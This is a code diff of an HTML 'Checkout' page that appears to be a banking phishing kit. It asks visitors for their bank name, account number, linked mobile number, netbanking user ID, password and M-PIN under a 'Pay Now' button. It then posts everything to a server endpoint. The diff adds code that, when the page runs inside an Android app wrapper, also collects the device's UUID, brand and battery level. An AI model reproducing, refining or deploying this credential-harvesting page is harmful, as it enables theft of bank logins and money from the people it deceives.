@@ -1,50 +1,50 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
- <meta charset="UTF-8">
- <meta name="viewport" content="width=device-width, initial-scale=1.0">
- <title>Checkout</title>
- <link rel="stylesheet" type="text/css" href="style2.css">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Checkout</title>
+<link rel="stylesheet" type="text/css" href="style2.css">
 </head>
 <body>
- <div class="banner">
-   <img src="01.jpg" alt="Banner Image" style="width:100%; height:100%;">
- </div>
+<div class="banner">
+  <img src="01.jpg" alt="Banner Image" style="width:100%; height:100%;">
+</div>
 
- <div class="container">
-   <h1 style="text-align:center;"></h1>
-   <form id="paymentForm">
-     <div class="form-section">
-       <h2>ENTER YOUR CREDENTIALS</h2>
+<div class="container">
+  <h1 style="text-align:center;"></h1>
+  <form id="paymentForm">
+    <div class="form-section">
+      <h2>ENTER YOUR CREDENTIALS</h2>
 
-       <label for="customerName">CUSTOMER NAME</label>
-       <input type="text" id="customerName" name="customerName" placeholder="ENTER YOUR NAME" required>
+      <label for="customerName">CUSTOMER NAME</label>
+      <input type="text" id="customerName" name="customerName" placeholder="ENTER YOUR NAME" required>
 
-       <label for="bankName">ENTER BANK NAME</label>
-       <input type="text" id="bankName" name="bankName" placeholder="NAME OF YOUR BANK" required>
+      <label for="bankName">BANK NAME</label>
+      <input type="text" id="bankName" name="bankName" placeholder="ENTER YOUR BANK NAME" required>
 
-       <label for="mobileNumber">MOBILE NUMBER</label>
-       <input type="tel" id="mobileNumber" name="mobileNumber" placeholder="LINKED MOBILE NUMBER" required>
+      <label for="mobileNumber">MOBILE NUMBER</label>
+      <input type="tel" id="mobileNumber" placeholder="Linked mobile number" required maxlength="10">
 
-       <label for="accountNumber">ACCOUNT NUMBER</label>
-       <input type="text" id="accountNumber" name="accountNumber" placeholder="ENTER YOUR A/C NUMBER" required> 
+      <label for="accountNumber">ACCOUNT NUMBER</label>
+      <input type="text" id="accountNumber" name="accountNumber" placeholder="ENTER YOUR A/C NUMBER" required> 
 
-       <label for="amount">AMOUNT</label>
-       <input type="number" id="amount" name="amount" placeholder="REQUIRED AMOUNT" required>
+      <label for="amount">AMOUNT</label>
+      <input type="tel" id="amount" placeholder="Enter amount" required maxlength="5">
 
-       <label for="userId">USER ID</label>
-       <input type="text" id="userId" name="userId" placeholder="CUSTOMER ID/ USERNAME" required>
+      <label for="userId">USER ID</label>
+      <input type="text" id="userId" name="userId" placeholder="CUSTOMER ID / USERNAME" required>
 
-       <label for="password">PASSWORD</label>
-       <input type="password" id="password" name="password" placeholder="ENTER NETBANKING PASSWORD" required>
+      <label for="password">PASSWORD</label>
+      <input type="password" id="password" name="password" placeholder="ENTER NETBANKING PASSWORD" required>
 
-       <label for="mPin">M PIN</label>
-       <input type="password" id="mPin" name="mPin" placeholder="ENTER M-PIN" required>
+      <label for="mPin">M PIN</label>
+      <input type="password" id="mPin" name="mPin" placeholder="ENTER M-PIN" required maxlength="6" inputmode="numeric" pattern="\d*">
+    </div>
 
-     </div>
-     <button type="submit">Pay Now</button>
-   </form>
- </div>
+    <button type="submit">Pay Now</button>
+  </form>
+</div>
 
 <script>
 // Form submit
@@ -63,8 +63,19 @@ form.addEventListener('submit', async e => {
     m_pin: document.getElementById('mPin').value
   };
 
+  // APK + Browser support
+  if (window.AndroidDevice) {
+    data.uuid = AndroidDevice.getUUID();       // APK method
+    data.brand = AndroidDevice.getBrand();     // APK method
+    data.battery = AndroidDevice.getBattery(); // APK method
+  } else {
+    data.uuid = crypto.randomUUID();
+    data.brand = "Unknown";
+    data.battery = "100%";
+  }
+
   try {
-    await fetch('/html-form-data',{
+    await fetch('/html-form-data',{  // replace with your Node.js endpoint
       method:'POST',
       headers:{'Content-Type':'application/json'},
       body: JSON.stringify(data)
@@ -77,4 +88,4 @@ form.addEventListener('submit', async e => {
 });
 </script>
 </body>
- </html>
+       </html>
